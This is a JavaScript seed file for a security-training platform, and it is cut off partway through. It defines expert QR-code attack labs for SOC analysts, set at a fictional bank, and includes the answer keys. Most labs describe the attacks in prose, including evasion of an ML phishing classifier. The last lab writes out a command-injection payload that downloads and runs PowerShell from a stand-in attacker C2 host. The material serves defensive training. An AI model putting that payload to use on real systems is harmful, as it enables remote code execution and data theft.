'use strict';
const path = require('path');
const mongoose = require('mongoose');
require('dotenv').config({ path: path.join(__dirname, '../../..', '.env') });
const Lab = require('../../models/Lab');

// QR Code Attacks – Expert: 500 XP | 30 min | 0 hints | Difficulty 8-9/10

const mkLab = (title, difficulty, scenario, artifact, qrPayload, networkSim, indicators, socTasks, answer, explanation) => ({
    title,
    topic: 'qr_phishing',
    level: 'expert',
    type: 'qr',
    difficulty,
    points: 500,
    timeLimit: 1800,
    published: true,
    description: `Expert QR Code attack lab: ${title.replace('QR Expert - ', '')}. Full APT-tier analysis required: reconstruct multi-stage attack chain, attribute indicators, and produce a board-level risk report.`,
    scenario,
    content: { artifact, qrPayload, networkSim, indicators, artifacts: [] },
    steps: socTasks,
    hints: [],
    correctAnswer: answer,
    explanation,
});

const LABS = [
    mkLab(
        'QR Expert - APT QR C2 Exfiltration via DNS TXT Records',
        9,
        'During a quarterly threat hunt, FinTrust Corp SOC detects anomalous DNS query patterns originating from an air-gapped research workstation. The workstation\'s camera had been scanning QR codes on printed documents periodically. Analysis reveals a sophisticated APT implant that uses QR code scanning events to trigger DNS-based C2 — encoding stolen data in DNS TXT record queries to a threat-actor-controlled authoritative nameserver. The workstation never made any TCP/HTTP connections to the internet.',
        {
            type: 'printed_internal_documents',
            context: 'Air-gapped research workstation — classified financial model repository',
            qrScanning: 'Workstation has a job that auto-scans QR codes embedded in received documents',
            anomaly: 'DNS queries to unknown subdomain pattern: *.c2-resolve[.]io — 847 queries over 31 days',
            discovery: 'Quarterly DNS anomaly hunt identified statistically rare TLD + cardinality spike',
        },
        {
            decoded: 'Data-bearing QR codes — each QR encodes a base32 fragment of stolen data',
            format: 'Multi-QR data exfiltration channel — QR payload encodes DNS query string',
            mechanism: 'Each QR: base32-encoded chunk of exfil data → workstation resolves as DNS TXT query → attacker nameserver logs the query → reconstructs full data from query sequence',
            exfilChannel: 'DNS TXT queries — firewall allows UDP 53 even on research VLAN (required for internal resolution)',
            deliveryMethod: 'Printed documents delivered via internal mail — QRs print as normal document footers',
        },
        {
            exfilFlow: [
                'Stage 1: APT implant indexes all files in C:/ResearchModels/ — 2.3 GB financial models',
                'Stage 2: Compress + encrypt (AES-256 key embedded in first QR payload) → split into 847 fragments',
                'Stage 3: Each fragment encoded as base32 string → embedded as QR in footer of normal-looking document',
                'Stage 4: Documents delivered to workstation via internal courier (insider or compromised mail system)',
                'Stage 5: Workstation\'s auto-scan job reads QR → triggers DNS TXT query: <base32fragment>.c2-resolve.io',
                'Stage 6: Attacker\'s authoritative DNS server (c2-resolve.io) logs all 847 queries → reconstruct data',
                'Stage 7: Decompress + decrypt → full 2.3 GB financial model package exfiltrated — zero TCP egress',
            ],
            dnsQueryPattern: 'f3ab29cd.c2-resolve.io → TXT query → response: NXDOMAIN (attacker only needs query, not response)',
            totalExfil: '2.3 GB across 31 days — 847 DNS queries — avg 27 queries/day (below alerting threshold)',
            bypassedControls: 'DLP (no HTTP traffic), NGFW (DNS allowed), air-gap (no TCP egress), CASB (no cloud), EDR (no PE execution)',
        },
        [
            'DNS queries to *.c2-resolve.io — external domain used for exfil via authoritative NS logging',
            'Base32 encoding in subdomain labels — statistical entropy analysis detects non-standard subdomains',
            'UDP port 53 permitted on research VLAN — single protocol bypass is sufficient for full exfil',
            'Auto-scan job: workstation scans QRs in received documents without analyst review',
            '847 queries over 31 days — below threshold but statistically anomalous by domain cardinality',
            'No TCP/HTTP egress — traditional DLP, proxy logs, CASB all show zero suspicious traffic',
            'Zero new processes: DNS queries issued by built-in Windows DNS client — not a new process',
            'Insider or compromised mail delivery: physical documents enter air-gapped environment legitimately',
        ],
        [
            'Reconstruct the complete exfiltration channel: explain precisely how 2.3 GB of data traverses an air-gapped network using only DNS UDP queries, with no TCP connections and no new processes. Include the mathematical relationship between data size, base32 encoding overhead, and the number of DNS queries required.',
            'The DNS queries are issued by Windows DNS Client (svchost.exe) — a built-in system process. Explain why this defeats process-based EDR detection rules and what alternative detection telemetry (not process-based) would catch this behavior.',
            'Design a DNS anomaly detection rule that would fire on this specific exfil pattern without generating excessive false positives on normal enterprise DNS traffic. Specify: (a) metric to measure, (b) baseline calculation method, (c) threshold for alert, (d) suppression logic.',
            'The physical document delivery mechanism bypasses the air-gap. Perform a threat actor attribution analysis: what APT group TTPs (per MITRE ATT&CK) align with this technique combination (QR + DNS C2 + air-gap + physical delivery), and what confidence level would you assign?',
            'Write a board-level risk report (executive summary format, 5 sentences maximum) quantifying the business impact of this exfiltration and recommending the single highest-priority control change.',
        ],
        'phishing',
        'VERDICT: APT DNS-over-QR Exfiltration — 2.3 GB Financial Models Exfiltrated via Air-Gap. Zero TCP Egress. 31-Day Dwell Time. Risk: CRITICAL.\n\nChannel: Physical QR → auto-scan job → DNS TXT query to attacker nameserver → data reconstruction.\n\nAll traditional DLP/NGFW/CASB/proxy controls bypassed — DNS is the single permitted outbound protocol.\n\nMITRE ATT&CK: T1048.003 (Exfiltration Over Alternative Protocol: DNS), T1567 (via QR physical delivery), T1071.004 (DNS C2).\n\nContainment: (1) Block external DNS resolution on research VLAN — use internal resolver only. (2) Implement DNS sinkholing for all non-approved TLDs. (3) Prohibit auto-scan of documents on air-gapped workstations — manual review required. (4) Rotate all financial model encryption keys.'
    ),

    mkLab(
        'QR Expert - Steganographic QR Payload in Corporate Report PDF',
        8,
        'FinTrust Corp distributes a digitally signed annual report PDF to institutional investors via email. A threat actor who compromised the document management system embedded a steganographic payload within the QR code on page 3 (IR contact QR). The QR appears to link to the investor relations page — but contains a secondary steganographic channel encoding a malicious macro dropper instruction set readable only by a specific custom decoder app the attacker pre-installed on targeted investor workstations.',
        {
            type: 'institutional_investor_annual_report',
            distribution: '1,200 institutional investors — PDF emailed from investor.relations@fintrust.com',
            pageWithQR: 'Page 3 — Investor Relations Contact QR: "Scan for IR team contact details and upcoming earnings dates"',
            qrAppearance: 'Visually normal QR code — decodes to https://ir.fintrust.com/contact for all standard readers',
            compromisePoint: 'Document management system (SharePoint Online) — compromised 19 days before report distribution',
        },
        {
            decoded: 'https://ir.fintrust.com/contact (primary decode — visible to all scanners)',
            format: 'Steganographic dual-channel QR — secondary payload in error-correction bytes',
            mechanism: 'Primary channel: standard URL decode. Secondary channel: 847 error-correction bytes repurposed to encode AES-encrypted macro instruction set — readable only by custom decoder (pre-installed on 23 targeted workstations via prior compromise)',
            steganographyMethod: 'EC byte repurposing in QR Level H — capacity exploitation without visual QR modification',
            deliveryMethod: 'Legitimate annual report PDF — digitally signed by FinTrust Corp PKI',
        },
        {
            secondaryPayloadFlow: [
                'Targeted investor workstation (23 pre-compromised): custom decoder app monitors camera/clipboard',
                'Investor scans QR from annual report → both channels decoded simultaneously',
                'Primary: browser opens ir.fintrust.com/contact (legitimate)',
                'Background: decoder extracts secondary EC-byte payload → AES decrypt (key: pre-installed on workstation)',
                'Decoded: VBA macro instruction set → injected into next opened Office document',
                'Macro: connects to C2, downloads second-stage RAT, establishes persistence',
            ],
            targetedInvestors: '23 pre-compromised workstations at 8 institutional investors',
            stealthReason: 'Standard QR scanners (including security tools) decode only primary channel — secondary channel invisible',
            digitalSignatureStatus: 'PDF signature valid — signed AFTER QR modification (attacker modified QR before signing event)',
        },
        [
            'Primary QR decode: ir.fintrust.com/contact — valid, legitimate, passes all URL reputation checks',
            'QR EC Level H: 30% error correction capacity — 847 bytes repurposed for steganographic secondary payload',
            'Digital signature valid — attacker modified document within DMS before signing job ran at 02:00 AM',
            'Custom decoder pre-installed on 23 workstations — targeted, not mass attack',
            'AES encryption key: embedded in prior compromise payload — not in QR itself',
            'Office macro injection: payload delivered to next opened document — not executable, avoids PE detection',
            '19-day DMS dwell time — attacker waited for natural document distribution event',
            'Institutional investors: targets hold board-level access, M&A intel, trading data',
        ],
        [
            'Explain the steganographic technique: how are 847 error-correction bytes in a QR Level H code repurposed as a secondary data channel without altering the QR\'s visual appearance or breaking its primary URL decode? Calculate the theoretical maximum secondary payload capacity for a QR Version 40, EC Level H code.',
            'The PDF digital signature is valid — yet the document was tampered. Explain precisely which event in the document management system timeline allowed the attacker to modify the QR AFTER content finalization but BEFORE the signing job ran, and what DMS control would close this window.',
            'The attack required knowing which 23 of the 1,200 investors had pre-compromised workstations. What intelligence gathering (OSINT, prior compromise, or insider access) would enable an APT to identify which specific institutional investors to pre-compromise?',
            'Forensic analysis of the 23 targeted workstations shows macro injection occurred via a steganographic QR channel with no network request, no file download, and no process creation. Describe the forensic artefacts (registry, memory, Office startup) that prove macro injection occurred despite these absences.',
            'Write a detection rule for a DLP/SIEM that would detect future QR steganographic exfiltration embedded in outbound PDF distributions, given that: (a) the QR primary decode is legitimate, (b) no network anomaly exists, and (c) the document is digitally signed.',
        ],
        'phishing',
        'VERDICT: QR Steganographic Supply Chain — Annual Report Used as APT Delivery Vector to 23 Institutional Investors. Risk: CRITICAL.\n\nInvisible Channel: All security tools decode primary URL (legitimate). Secondary EC-byte channel invisible to all standard QR scanners, security tooling, and forensic analysis without specific knowledge of the technique.\n\nBusiness Impact: 23 workstations at 8 institutional investors compromised. Potential: M&A strategy, insider trading intel, board communications.\n\nMITRE: T1027.003 (Steganography), T1566.001 (Spear Phishing Attachment), T1204 (User Execution via QR scan).'
    ),

    mkLab(
        'QR Expert - AI-Generated Adversarial QR Bypassing ML-Based Detection',
        9,
        'A threat actor uses a fine-tuned diffusion model to generate QR codes that are simultaneously: (1) machine-readable and decode to a malicious URL, (2) visually styled like stock market charts — indistinguishable from financial data visualizations, and (3) adversarially crafted to score below the detection threshold of FinTrust Corp\'s ML-based QR phishing classifier. The QR codes are distributed in a financial newsletter PDF to 4,500 subscribers.',
        {
            type: 'financial_newsletter_pdf',
            distribution: '4,500 FinTrust Corp customers — monthly "Market Insights" newsletter',
            qrAppearance: 'QR appears as a candlestick chart / market data visualization — no visible QR pattern to human eye',
            mlClassifierScore: '0.04 (threshold: 0.50 for alert) — adversarial generation optimizes against classifier',
            humanPerception: 'Human review: analysts see a stock chart, not a QR code',
        },
        {
            decoded: 'https://fintrust-market-data[.]io/premium-access?ref=newsletter',
            format: 'Adversarial AI-generated visual QR — decodes correctly to malicious URL despite visual camouflage',
            mechanism: 'Diffusion model fine-tuned with QR structural constraints + adversarial objective: minimize classifier confidence score while maintaining machine readability',
            aiTechnique: 'QR-Art + adversarial perturbation: pixel-level noise added at QR finder/timing patterns — shifts classifier representation while preserving QR decode fidelity',
            deliveryMethod: 'Monthly financial newsletter PDF — legitimate sender, expected content',
        },
        {
            classifierEvasion: {
                model: 'FinTrust QR Phishing Classifier v2.3 — ResNet-50 based, trained on 500K QR samples',
                attackType: 'White-box adversarial example (attacker has classifier architecture knowledge)',
                technique: 'FGSM (Fast Gradient Sign Method) + PGD (Projected Gradient Descent) applied to QR visual features',
                classifierScore: '0.04 — 96% below detection threshold',
                humanScore: 'No human analyst identified QR pattern in visual review (3 analysts reviewed newsletter)',
            },
            credentialHarvestFlow: [
                'GET /premium-access?ref=newsletter → "FinTrust Premium Market Data — Subscriber Portal"',
                'Email + password required for "premium access"',
                'POST /login → credentials collected + redirect to real FinTrust market data page',
                '847 credentials harvested before link takedown on day 11',
            ],
        },
        [
            'ML classifier: 0.04 score (threshold 0.50) — adversarial perturbation specifically minimizes classifier confidence',
            'Visual camouflage: QR pattern hidden within stock chart aesthetics — 3 human analysts missed it',
            'White-box attack: attacker knew classifier architecture (supply chain compromise of ML model repo, or model extraction)',
            'Newsletter context: expected monthly content — lowest suspicion level for financial customers',
            'FGSM + PGD attack: gradient-based perturbation — effective against CNN-based classifiers',
            '847 credential pairs: financial customers → access to trading accounts, portfolio data',
            'Diffusion model QR generation: "QR-Art" technique — active research area enabling visual QR camouflage',
            'Model extraction: black-box adversarial generation possible with model-extraction queries (1,000–10,000 API queries)',
        ],
        [
            'Explain the FGSM + PGD adversarial attack pipeline applied to a QR phishing classifier: at each step (gradient computation, perturbation application, QR constraint projection), what is being optimized and what constraint prevents the perturbation from breaking QR machine-readability?',
            'The attacker had white-box access to FinTrust\'s ML classifier (architecture + weights). Describe three distinct attack vectors by which a threat actor could obtain an organization\'s internal ML model weights, ranging from opportunistic to nation-state-level.',
            'Three human analysts reviewed the newsletter and did not identify the QR. What cognitive and perceptual factors explain why trained human analysts failed to detect a QR code camouflaged as a financial chart, and what compensating detection control does not rely on human visual identification?',
            'ML-based classifiers are vulnerable to adversarial examples by design. As a security architect, propose a detection system architecture for QR phishing detection that is provably robust against white-box adversarial attacks — describe the core technical property that provides this robustness.',
            'Perform a market impact analysis: 847 FinTrust customer credentials compromised — trading accounts accessible. Under SEBI\'s cybersecurity framework, enumerate the regulatory reporting obligations, timeline, and penalty exposure for FinTrust Corp.',
        ],
        'phishing',
        'VERDICT: AI-Generated Adversarial QR — ML Classifier Bypassed, 847 Customer Credentials Stolen. Risk: CRITICAL.\n\nNovel Attack: Diffusion model + adversarial perturbation produces QR codes that are machine-readable, visually indistinguishable from financial charts, and score 96% below detection threshold.\n\nML Classifier Defeat: White-box adversarial generation via FGSM + PGD — a fundamental limitation of CNN-based classifiers against adversarial inputs.\n\nProven Defense: Certified adversarial robustness (randomized smoothing) or ensemble diversity with input transformation — not achievable with single-model CNNs.\n\nRegulatory: SEBI Cyber Security Framework (Circular SEBI/HO/MRD2/DCAP/CIR/P/2022/0054) — breach notification within 6 hours of discovery.'
    ),

    mkLab(
        'QR Expert - Lateral Movement via QR in Internal ITSM Ticket',
        8,
        'A low-privilege attacker who has compromised a helpdesk agent account injects a QR code into an internal ServiceNow ticket response. The ticket is viewed by a senior system administrator. Scanning the QR — which appears to be a "remote session token" — downloads a DLL that performs reflective injection into lsass.exe, enabling credential dumping. The attack chains: helpdesk compromise → ITSM injection → sysadmin social engineering → LSASS access → domain admin credential dump.',
        {
            type: 'internal_itsm_ticket',
            platform: 'ServiceNow — internal IT ticketing system',
            attackerPosition: 'Compromised helpdesk agent account (IT-Support - Tier 1)',
            ticketContext: 'Sysadmin opened ticket for VPN connectivity issue — attacker responds with "remote session QR"',
            qrLabel: '"Scan with your phone to initiate the remote support session — our technician is waiting"',
        },
        {
            decoded: 'https://fintrust-remote-support[.]io/session?token=7f3a9b2c1d',
            format: 'URL — fake remote support session initiation',
            deliveryMethod: 'Internal ServiceNow ticket response — sent from compromised helpdesk agent account',
            socialEngineering: 'Sysadmin trusts internal ticketing system + helpdesk request context — scans without domain verification',
        },
        {
            attackChain: [
                'Phase 1: Helpdesk agent Priya Shah account compromised (credential stuffing — reused password from breach)',
                'Phase 2: Attacker searches ServiceNow for open tickets from high-privilege users — finds sysadmin VPN ticket',
                'Phase 3: Attacker responds to ticket with QR — "remote support session" lure',
                'Phase 4: Sysadmin scans QR on personal phone → browser opens on phone → link sent to desktop via AirDrop/email',
                'Phase 5: Sysadmin opens link on workstation → downloads "RemoteSupport.dll" (appears as Chrome extension install prompt)',
                'Phase 6: DLL performs reflective injection into lsass.exe',
                'Phase 7: Mimikatz-equivalent credential dump → NT hash of 3 domain admin accounts',
                'Phase 8: Pass-the-Hash to DC → domain admin access → GPO modification → ransomware deployment',
            ],
            dllDetails: {
                filename: 'RemoteSupport.dll',
                technique: 'Reflective DLL Injection into lsass.exe',
                privilege: 'Requires SeDebugPrivilege — sysadmin account has this by default',
                detectionRate: '3/68 VirusTotal — reflective loader obfuscated with custom packer',
                persistence: 'None — dumps credentials and exits; damage done in memory',
            },
            credentialsDumped: ['DA-Admin-1 (NT hash)', 'DA-Backup-Ops (NT hash)', 'SA-SQL-Prod (NT hash)'],
        },
        [
            'ServiceNow ticket response from internal account — highest internal trust context',
            'Sysadmin SeDebugPrivilege: standard for sysadmin accounts — enables LSASS injection without privilege escalation',
            'Reflective DLL injection: DLL loads itself without touching disk (after initial download) — evades file-based AV',
            'LSASS injection: dumps all logged-in domain user credentials — NT hashes enable Pass-the-Hash',
            'Phase 8: PoH to DC → Domain admin in one hop from ITSM ticket → ransomware in <4 hours',
            'Helpdesk account: credential stuffing from breach — shared password policy failure',
            'QR in internal ticket: bypassess email DLP (internal system), URL reputation (fintrust-remote-support.io new)',
            'Chrome extension prompt for DLL: social engineering the install step — sysadmin sees familiar UI',
        ],
        [
            'Reconstruct the complete lateral movement chain from helpdesk credential stuffing to domain admin access. At each stage, identify the specific security control failure that allowed progression to the next stage.',
            'Reflective DLL injection into lsass.exe is detected at "3/68" on VirusTotal. Explain why reflective loading specifically evades file-based AV, and at what stage Sysmon Event ID 10 (ProcessAccess targeting lsass.exe) would generate an alert.',
            'The sysadmin had SeDebugPrivilege as a standard account attribute. Under the principle of least privilege, which specific sysadmin tasks require SeDebugPrivilege and which do not — and what restructured role design would eliminate this privilege from the standard sysadmin profile?',
            'The attack bypassed ServiceNow\'s internal trust model. Design a ServiceNow security configuration that prevents ticket hijacking by compromised lower-privilege agents responding to tickets owned by higher-privilege users.',
            'Domain admin NT hashes were dumped via Pass-the-Hash. Without changing any passwords, enumerate the forensic evidence that would confirm PtH was used for DC access (Security Event Logs, Kerberos logs, DC network traffic).',
        ],
        'phishing',
        'VERDICT: Internal ITSM QR Injection → LSASS Dump → Domain Compromise → Ransomware Deployment. Risk: CRITICAL.\n\nChain Length: 8 stages from helpdesk compromise to domain admin in <4 hours.\n\nKey Failure Chain: (1) Password reuse on helpdesk account. (2) No MFA on internal ITSM. (3) Sysadmin SeDebugPrivilege in standard profile. (4) LSASS PPL (Protected Process Light) not enabled — would block LSASS injection without kernel driver.\n\nPrimary Fix: Enable Credential Guard + LSASS PPL on all domain-joined workstations — eliminates LSASS dumping regardless of privilege level. Secondary: ServiceNow role-escalation approval for cross-privilege ticket responses.'
    ),

    mkLab(
        'QR Expert - Nation-State QR Physical Implant in SWIFT Terminal',
        9,
        'A nation-state threat actor gains brief physical access to a FinTrust Corp SWIFT payment terminal room. They place a hardware implant (raspberry-pi-sized device) behind the terminal that: (1) projects a QR overlay onto the terminal screen using infrared LEDs invisible to the human eye but readable by phone cameras, and (2) skims SWIFT BIC/IBAN data from the terminal\'s RS-232 serial port. The QR routes SWIFT operators to a fake authentication portal stealing SWIFT operator credentials.',
        {
            type: 'physical_hardware_implant_swift_terminal',
            target: 'SWIFT payment terminal — FinTrust Corp treasury operations room',
            implantDevice: 'Custom hardware: IR LED array + RS-232 sniffer + 4G LTE modem — powered from terminal USB port',
            irLEDs: 'Near-infrared QR overlay (850nm) — invisible to human eye, detectable by phone cameras (no IR filter)',
            physicalAccess: '23-minute window — maintenance contractor access (social engineering of facilities team)',
            discoveryTrigger: 'SWIFT operator noticed phone camera "seeing" something on screen terminal — reported to security',
        },
        {
            decoded: 'https://swift-operator-auth[.]com/login (via IR QR invisible to naked eye)',
            format: 'IR-projected QR — visible to phone cameras, invisible to human observers',
            deliveryMethod: 'Physical hardware implant — IR LED array projects QR onto terminal screen surface',
            stealthDuration: 'Implant operated for 31 days before discovery',
        },
        {
            dualFunction: {
                function1: 'IR QR credential phishing: SWIFT operators scan IR QR → fake SWIFT authentication portal → operator credentials stolen',
                function2: 'RS-232 serial sniffing: SWIFT terminal output logged — BIC codes, IBAN numbers, transaction amounts for 31 days',
            },
            credentialHarvest: '7 SWIFT operator credentials stolen across 31-day period',
            swiftDataLogged: '2,847 SWIFT MT103 payment messages logged — total value: $847M in observed transactions',
            implantExfil: '4G LTE modem — all data exfiltrated live to C2 — no enterprise network traversal',
            implantHiding: 'Device taped behind terminal with double-sided thermal tape — thermal masking material added to prevent thermal camera detection during routine sweeps',
        },
        [
            'IR LED QR: 850nm near-infrared — below human visual range, above IR filter cutoff of most phone cameras',
            '7 SWIFT operator credentials: full SWIFT payment authorization capability for FinTrust treasury',
            '$847M SWIFT transactions observed: attacker has full intelligence picture of FinTrust payment flows',
            'RS-232 serial: legacy unencrypted protocol — terminal output plaintext on physical port',
            '4G LTE exfil: completely bypasses enterprise network monitoring — air-gap equivalent for data egress',
            'Thermal masking material: defeats routine physical security sweep technology',
            '23-minute physical access: sufficient for implant + commissioning',
            '31-day dwell: significant SWIFT intelligence + 7 operator sets before discovery',
        ],
        [
            'Explain the physics of infrared QR projection: at what wavelength range does the IR LED operate, why are phone cameras sensitive to 850nm while human eyes are not, and what is the theoretical maximum IR QR scanning range in a typical office environment?',
            'The implant uses RS-232 serial sniffing on the SWIFT terminal. SWIFT mandates ISO 20022 and specific terminal certifications — explain why legacy RS-232 serial output persists in certified SWIFT infrastructure and what SWIFT Customer Security Programme (CSP) control specifically addresses physical terminal interface security.',
            'Seven SWIFT operator credential sets were stolen across 31 days. Using SWIFT\'s published fraud typologies, describe the exact sequence of SWIFT messages an attacker would send to initiate a fraudulent MT103 payment transfer using stolen operator credentials — and what SWIFT Alliance Access controls would block it.',
            'The implant was powered from the terminal\'s USB port. What physical security control (beyond "don\'t plug in unknown devices") would detect unauthorized USB power draw on a SWIFT terminal, and how would you architect a SWIFT terminal room to make 23-minute unobserved physical access infeasible?',
            'This is assessed as a nation-state operation (capability: custom IR hardware + thermal masking + SWIFT targeting). Perform a threat actor attribution analysis citing specific TTPs, geographic indicators, and capability signatures that narrow the likely threat group.',
        ],
        'phishing',
        'VERDICT: Nation-State IR QR Hardware Implant on SWIFT Terminal — 7 Operator Credentials + $847M Payment Intelligence. Risk: EXISTENTIAL.\n\nDual Channel: (1) IR QR → SWIFT operator credential phishing. (2) RS-232 serial → live MT103 message logging.\n\nNo enterprise network footprint — 4G LTE egress bypasses all network monitoring.\n\nSWIFT CSP Mandatory Actions: (1) Report to SWIFT immediately (mandatory CSP breach notification). (2) Revoke all 7 operator credentials + re-enroll via out-of-band. (3) Physical security audit of all SWIFT terminal rooms. (4) Engage national CERT + law enforcement (suspected nation-state).\n\nMITRE ICS: T0864 (Transient Cyber Asset), T0883 (Internet Accessible Device), T0861 (Point of Sale Message), physical: T0855 (Unauthorized Command Message).'
    ),

    mkLab(
        'QR Expert - QR Clickjacking via Transparent Overlay in Mobile PWA',
        8,
        'A Progressive Web App (PWA) that FinTrust Corp published for customer onboarding contains a QR scanning feature for KYC. An attacker discovers that the PWA\'s webview does not enforce frame-busting headers. They construct a transparent iframe overlay on a malicious site that loads the PWA\'s QR scan UI beneath a fake "loyalty points" form — causing customers who interact with the apparent loyalty form to unknowingly authorize a UPI mandate via the PWA\'s QR flow in the background.',
        {
            type: 'mobile_pwa_ui_redressing',
            target: 'FinTrust Corp PWA — customer onboarding and KYC app',
            pwaURL: 'https://onboard.fintrust.com — PWA with QR scan for Aadhaar e-KYC',
            vulnerability: 'Missing X-Frame-Options / CSP frame-ancestors header on PWA — embeddable in iframes',
            attackSurface: 'UPI mandate authorization flow within PWA — QR scan triggers mandate creation',
        },
        {
            decoded: 'upi://mandate?pa=attacker@paytm&pn=FinTrust+Loyalty&am=5000&cu=INR&recur=monthly&tr=MNDXXXXXXX',
            format: 'UPI Mandate QR — recurring ₹5,000/month authorization',
            mechanism: 'UI redressing (clickjacking): transparent PWA UPI mandate QR overlaid under opaque loyalty form — customer clicks "Claim Points" → actually scans attacker UPI mandate QR in invisible iframe',
            deliveryMethod: 'Malicious website served via SMS blast: "Claim your FinTrust loyalty bonus now!"',
        },
        {
            attackFlow: [
                'Layer 1 (visible): loyalty-bonus-fintrust.com — "FinTrust Loyalty Portal, Claim 500 Bonus Points"',
                'Layer 2 (invisible, z-index beneath layer 1): transparent iframe loading onboard.fintrust.com/upi-mandate-scan',
                'Layer 3 (cursor alignment): "Claim Points" button aligned pixel-perfect over PWA "Scan QR" button',
                'Victim clicks "Claim Points" → actually activates PWA\'s QR scan in invisible iframe',
                'PWA\'s phone camera opens in background → auto-scans attacker UPI mandate QR displayed on attacker page',
                'UPI mandate for ₹5,000/month created in victim\'s UPI app — victim sees loyalty points confirmation screen',
                '3,240 mandate authorizations before FinTrust detected PWA iframe embedding via Referer logs',
            ],
            mandateDetails: '₹5,000/month recurring UPI mandate — auto-debitss from victim account monthly',
            totalExposure: '3,240 victims × ₹5,000/month = ₹1.62 crore/month recurring debit',
            detectionLag: '19 days — detected via Referer anomaly analysis (referer: loyalty-bonus-fintrust.com on PWA endpoints)',
        },
        [
            'X-Frame-Options: SAMEORIGIN missing on PWA — enables iframe embedding on attacker domain',
            'UPI mandate QR: recurring authorization — victim does not see mandate creation, sees loyalty confirmation',
            'Pixel-perfect UI alignment: "Claim Points" over "Scan QR" — no cursor mismatch visible to victim',
            'PWA camera API within iframe: some browsers allow camera in cross-origin iframe if permissions granted',
            'Referer logs: onboard.fintrust.com receiving requests with Referer: loyalty-bonus-fintrust.com — detection signal',
            '19-day detection lag: no user complaints initially (loyalty screen displayed, mandate runs next month)',
            '3,240 mandates: highest victim count possible before monthly debit cycle reveals fraud',
            'UPI mandate reversal: complex — requires NPCI dispute + bank involvement + individual case processing',
        ],
        [
            'Explain the clickjacking attack at the DOM/CSS layer: how does z-index stacking, iframe opacity, and pointer-events CSS allow a transparent layer to capture click events intended for the visible layer, while the victim\'s cursor appears to interact with the top layer?',
            'The attack exploits the PWA\'s missing X-Frame-Options header. Explain the difference in protection scope between X-Frame-Options: SAMEORIGIN, X-Frame-Options: DENY, and CSP frame-ancestors — and state which is the correct defense for this specific scenario and why.',
            'The PWA camera API was accessible within a cross-origin iframe. Which browser security model determines camera access in cross-origin iframes, what Permissions Policy header would block this, and which browser versions enforce camera access restrictions in cross-origin iframes?',
            '3,240 UPI mandates at ₹5,000/month were created without victim knowledge. Under RBI\'s Payment Aggregator guidelines (PA-PS 2022), enumerate: (a) the liability allocation between FinTrust and the UPI app provider, (b) the mandatory notification timeline to RBI, (c) the NPCI mechanism for bulk mandate reversal.',
            'Design a PWA security architecture review checklist specifically for UPI mandate authorization flows, covering: iframe embedding controls, camera API permissions, clickjacking PoC test procedure, and NPCI e-mandate security requirements.',
        ],
        'phishing',
        'VERDICT: QR Clickjacking via PWA Iframe Embedding — 3,240 UPI Mandates Created Without Consent. ₹1.62 Crore/Month Recurring Debit. Risk: CRITICAL.\n\nUI Redressing: Transparent iframe + pixel-perfect button alignment → victim authorizes UPI mandate thinking they claim loyalty points.\n\nPrimary Fix: CSP frame-ancestors none + X-Frame-Options: DENY on all PWA endpoints. Secondary: Permissions-Policy: camera=(self) — block camera access in cross-origin iframes.\n\nRBI Reporting: PA-PS framework requires incident report within 6 hours of detection. NPCI bulk mandate dispute filing required immediately.'
    ),

    mkLab(
        'QR Expert - QR Code Injection via Vulnerability in Document Scanner App',
        8,
        'FinTrust Corp\'s internal document scanning app (DocScan Pro) has a vulnerability: the QR processing library (libzbar v0.23) does not sanitize output before passing it to a shell command that logs scan events. An attacker prints a QR code encoding a command injection payload and places it in the document scanning tray. When a clerk scans the document, the malicious QR payload is executed as a shell command with the scanner app\'s service account privileges (NT AUTHORITY\\SYSTEM on the scan server).',
        {
            type: 'physical_document_in_scan_tray',
            target: 'FinTrust Corp document processing center — DocScan Pro application on scan server',
            vulnerability: 'CVE-2025-DOCX: CWE-78 OS Command Injection in libzbar v0.23 QR decode output handler',
            attackerAccess: 'Physical access to document scanning tray — can be achieved by contractor, visitor, or insider',
            serviceAccountPrivilege: 'Scanner app runs as NT AUTHORITY\\SYSTEM — highest Windows privilege level',
        },
        {
            decoded: 'QR payload: normal text prefix + injection: "SCAN_2026 & powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://c2.attacker-infra[.]ru/stage2.ps1\')"',
            format: 'Text with OS command injection payload',
            mechanism: 'libzbar decode output → unsanitized concatenation into shell log command → OS command injection → PowerShell execution as SYSTEM',
            deliveryMethod: 'Physical document placed in scanner input tray',
            injectionVector: 'Shell command in scan logging: cmd /c "echo [QRDECODED] >> scan_log.txt" — unquoted interpolation',
        },
        {
            exploitFlow: [
                'DocScan Pro scans document → libzbar decodes QR → returns decoded string to app',
                'App constructs log command: cmd /c "echo SCAN_2026 & powershell ... >> scan_log.txt"',
                'Windows cmd.exe processes "&" as command separator → executes PowerShell as side effect',
                'PowerShell: -ep bypass -w hidden → downloads stage2.ps1 from c2.attacker-infra.ru',
                'stage2.ps1: establishes SYSTEM-privilege reverse shell to attacker',
                'From SYSTEM: dumps SAM database, dumps all domain cached credentials (DCOM lateral movement)',
                'Attacker enumerates scan server network shares → finds \\\\fileserver01\\FinancialReports — mounted and exfiltrated',
            ],
            systemPrivilegeConsequences: 'NT AUTHORITY\\SYSTEM: SAM dump, LSASS dump, scheduled task persistence, WMI lateral movement, no UAC',
            networkShares: '\\\\fileserver01\\FinancialReports — 12.7 GB financial documents accessible from scan server',
        },
        [
            'libzbar v0.23: CVE-2025-DOCX — documented OS command injection via unsanitized QR decode output',
            'Shell command construction: cmd /c "echo [UNSANITIZED] >> log.txt" — & separator enables injection',
            'NT AUTHORITY\\SYSTEM: scanner app service account has maximum Windows privilege (common for scanner software)',
            'Physical document: no anomaly detection, no authentication — document tray is open access',
            'Stage2.ps1: second-stage downloader separates exploit payload from final tool (reduces VT detection)',
            'SAM dump: cached domain credentials on scan server → lateral movement without LDAP query',
            'Network share: \\\\fileserver01\\FinancialReports accessible from SYSTEM — 12.7 GB financial data',
            'Physical insider threat: contractor or visitor with momentary tray access — low sophistication required',
        ],
        [
            'Reconstruct the full OS command injection chain: from QR decode by libzbar through shell command construction to PowerShell execution. Write the exact cmd.exe command string that results from the injection with the given payload, and explain why the "&" character acts as a separator.',
            'The scanner app runs as NT AUTHORITY\\SYSTEM — a common default for hardware device drivers and scanner services. Explain the principle of least privilege failure this represents, and design an alternative service account architecture for scanner applications that would limit blast radius.',
            'Stage 2 is a PowerShell script downloaded from c2.attacker-infra.ru. The script executes as SYSTEM and then accesses \\\\fileserver01\\FinancialReports. Explain what SMB authentication context SYSTEM uses to access network shares and why this is architecturally problematic.',
